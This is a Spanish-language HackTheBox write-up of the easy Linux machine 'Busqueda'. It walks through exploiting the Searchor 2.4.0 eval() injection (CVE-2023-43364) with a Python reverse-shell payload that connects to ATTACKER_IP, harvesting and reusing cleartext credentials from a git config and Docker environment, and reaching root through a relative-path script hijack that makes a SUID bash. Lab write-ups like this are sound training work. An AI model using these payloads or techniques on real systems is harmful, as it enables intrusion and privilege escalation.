Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #command-injection #credential-reutilization #CVE-2023-43364 #

![](assets/Pasted%20image%2020251217152713.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

- ttl 63 maquina linux

```bash
> ping -c 1 10.129.228.217
PING 10.129.228.217 (10.129.228.217) 56(84) bytes of data.
64 bytes from 10.129.228.217: icmp_seq=1 ttl=63 time=111 ms

--- 10.129.228.217 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.080/111.080/111.080/0.000 m
```

Realizo un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -sS --min-rate 5000 -Pn -n -vvv 10.129.228.217
------------------------------------------------------------------
Host is up, received user-set (0.11s latency).
Scanned at 2025-12-17 15:28:21 CST for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 80,22 -sS -sV -sC -n -Pn -vvv 10.129.228.217 -oN nmap/target
--------------------------------------------------------------------------------------------------------------------------------------------
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
- Puerto 80 HTTP: Apache httpd 2.4.52 y tenemos un dominio `searcher.htb`

Colocamos el dominio en el **/etc/hosts**

```bash
> cat /etc/hosts
10.129.228.217 searcher.htb
```

## Enumeración

**Puerto 80 HTTP.**

- Al parecer la pagina es como un buscador universal

![](assets/Pasted%20image%2020251217153458.png)

- Hay distintas fuente/motores de búsqueda
- Podemos ver que utiliza Flask y Searchor 2.4.0

![](assets/Pasted%20image%2020251217153550.png)


## Explotación


Buscando por vulnerabilidades para el servicio `Searchor 2.4.0` me encuentro con el [CVE-2023-43364](https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303) que consiste en una ejecución de codigo abusando de la función `eval()` que usa searchor internamente.


- Es en la linea 5 donde se interpola la variable query sin ninguna sanitización, por lo cual nuestro payload va a escapar de las comillas para ejecutarse.

Codigo interno de searchor.
```bash
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< See here 
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
```

Primero nos pondremos en escucha

```bash
> sudo nc -nlvp 443
```

Y vamos a colocar nuestro payload en la parte de búsqueda:

- Reverse-Shell en python:

```bash
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

![](assets/Pasted%20image%2020251217155938.png)

Recibimos la conexión.

```bash
Listening on 0.0.0.0 443
Connection received on 10.129.228.217 47442
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```


## Escalada de Privilegios

En el directorio **home** del usuario svc encontramos la primer flag

```bash
svc@busqueda:~$ cat user.txt
ccb6e6fcf******
```

Dentro del directorio de la app principal nos encontramos con un repositorio `git`

```bash
svc@busqueda:/var/www/app$ ls -la
ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Dec 17 21:24 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

Al verificar que contiene nos encontramos con un archivo **config** 

- Encontramos la credenciales cody:jh1usoih2bkjaspwe92 
- Encontramos un subdominio `gitea.searcher.htb`

```bash
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Metimos el subdominio al `/etc/hosts`

**Gitea** es un software para el control de versiones auto alojado

![](assets/Pasted%20image%2020251217162929.png)



Con las credenciales anteriormente encontradas podemos tratar de logearnos.

![](assets/Pasted%20image%2020251217163016.png)

Dentro del **Gitea** solo encontramos un usuario **administrator**  y un **repositorio**.

- Podemos tratar de reutilizar las credenciales para el sudo -l.

```bash
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

- Sirvió y vemos un script /opt/scripts/system-checkup.py

Al ejecutar el script vemos esto:

- Al parecer es un script para administrar contenedores de Docker.

```bash
svc@busqueda:/var/www/app/.git$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py a
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Usamos el script para listar contenedores de docker.

- Vemos un contenedor `mysql` corriendo en el puerto 3306

```bash
svc@busqueda:/var/www/app/.git$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Utilizando el mismo script `system-checkup.py` podemos ver la configuración del contenedor indicando la segunda opción docker-inspect.

- Podemos ver las siguientes credenciales de MYSQL MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh

```bash
svc@busqueda:/var/www/app/.git$ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} mysql_db
{f84a6b33fb5a   false false false map[3306/tcp:{} 33060/tcp:{}] false false false [MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=1.14 MYSQL_MAJOR=8.0 MYSQL_VERSION=8.0.31-1.el8 MYSQL_SHELL_VERSION=8.0.31-1.el8] [mysqld] <nil> false mysql:8 map[/var/lib/mysql:{}]  [docker-entrypoint.sh] false  [] map[com.docker.compose.config-hash:1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:db com.docker.compose.version:1.29.2]  <nil> []}
```

Reutilice las credenciales para acceder al **gitea** como el usuario administrator y encontré un repositorio de scripts

- administrator:yuiu1hoiu4i5ho1uh 

Dentro del gitea me encontré con esta parte del script `system-checkup.py`.

- Esta ejecutando `./full-checkup.sh` sin ruta absoluta.

![](assets/Pasted%20image%2020251217165619.png)

Vamos a crear un script malicioso con el mismo nombre `full-checkup.sh` que se va a ejecutar cuando ejecutemos el script principal `system-checkup.py`.

- Haremos una copia de la `bash` y le colocaremos el bit `suid` 

```bash
svc@busqueda:~$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/wndr\nchmod 4777 /tmp/wndr' > full-checkup.sh
svc@busqueda:~$ chmod +x full-checkup.sh
```

Recordemos el funcionamiento del script, en este caso utilizaremos la opción`full-checkup` para que ejecute nuestro script `full-checkup.sh`

```bash
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Ahora ejecutemos el script

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup
sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done
```

Ahora podemos ir a nuestra copia de la bash.

```bash
svc@busqueda:~$ /tmp/wndr -p
/tmp/wndr -p
wndr-5.1# id
id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
wndr-5.1# 
```

***PWNED***

![](assets/Pasted%20image%2020251217170702.png)